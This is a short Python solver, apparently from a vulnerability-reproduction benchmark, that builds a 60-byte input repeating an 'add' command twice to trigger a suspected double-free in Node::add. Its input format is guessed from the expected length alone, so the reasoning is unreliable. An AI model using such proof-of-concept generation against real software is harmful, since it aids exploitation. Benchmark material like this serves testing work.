class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double-free when Node::add throws an exception.
        # A common trigger for an exception in an add method is a duplicate entry.
        # The PoC will attempt to add the same child to a parent twice.
        #
        # The ground-truth PoC length is 60 bytes.
        # This suggests a two-line PoC, with each line being 30 bytes long.
        # The format is likely "add <parent_id> <child_id>\n".
        #
        # Line length calculation:
        # len("add") + len(" ") + len(parent) + len(" ") + len(child) + len("\n") = 30
        # 3          + 1         + len(parent) + 1         + len(child) + 1          = 30
        # len(parent) + len(child) = 24
        #
        # We can use two 12-byte identifiers to meet this length requirement.
        
        parent_id = b"p" * 12
        child_id = b"c" * 12

        # Construct the command line.
        line = b"add " + parent_id + b" " + child_id + b"\n"

        # Repeat the line. The first call succeeds, the second throws,
        # triggering the double-free vulnerability.
        poc = line * 2
        
        return poc
